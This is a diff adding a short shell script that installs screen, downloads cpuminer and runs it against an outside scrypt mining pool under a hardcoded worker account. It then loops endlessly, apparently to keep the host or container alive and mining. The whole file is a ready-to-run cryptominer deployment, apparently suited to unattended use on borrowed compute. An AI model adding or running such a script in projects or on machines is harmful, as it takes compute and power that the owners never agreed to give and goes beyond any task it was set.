@@ -1,0 +1,12 @@
+
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
+tar xzf pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
+cd pooler-cpuminer-2.5.1
+./minerd -a scrypt -t 4 -s 4 -o stratum+tcp://bitcoinfast.stratum.cminors-pool.com:18004 -u tuyul020784@gmail.com.nanung -p nanung
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
